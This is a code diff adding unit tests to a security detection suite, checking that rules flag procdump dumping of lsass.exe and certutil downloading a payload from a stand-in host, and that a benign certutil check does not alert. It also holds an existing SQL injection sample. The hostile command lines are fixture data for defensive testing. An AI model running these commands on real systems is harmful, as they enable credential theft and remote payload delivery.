@@ -35,6 +35,42 @@ class DetectionTests(unittest.TestCase):
         alerts = run_detections([event(1, source='waf', event_type='http_request', src_ip='198.51.100.25', message='GET /search?q=1 UNION SELECT password FROM users user_agent=sqlmap')])
         self.assertTrue(any(a.rule_id == 'DET-WAF-001' and a.severity == 'high' for a in alerts))
 
+    def test_lsass_dumping_via_procdump_is_critical(self):
+        alerts = run_detections([
+            event(
+                1,
+                source='windows',
+                event_type='windows_event',
+                process_name='procdump64.exe',
+                command_line='procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp',
+            )
+        ])
+        self.assertTrue(any(a.rule_id == 'DET-WIN-002' and a.severity == 'critical' for a in alerts))
+
+    def test_certutil_remote_transfer_is_high(self):
+        alerts = run_detections([
+            event(
+                1,
+                source='windows',
+                event_type='windows_event',
+                process_name='certutil.exe',
+                command_line='certutil.exe -urlcache -split -f https://example.invalid/payload.bin C:\\Temp\\payload.bin',
+            )
+        ])
+        self.assertTrue(any(a.rule_id == 'DET-WIN-003' and a.severity == 'high' for a in alerts))
+
+    def test_benign_certutil_local_certificate_check_does_not_alert(self):
+        alerts = run_detections([
+            event(
+                1,
+                source='windows',
+                event_type='windows_event',
+                process_name='certutil.exe',
+                command_line='certutil.exe -dump C:\\certs\\server.cer',
+            )
+        ])
+        self.assertFalse(any(a.rule_id == 'DET-WIN-003' for a in alerts))
+
     def test_benign_events_no_high_or_critical_alerts(self):
         events = [event(i, status='success', src_ip=f'10.0.0.{i}', user=f'user{i}') for i in range(1, 4)]
         alerts = run_detections(events)
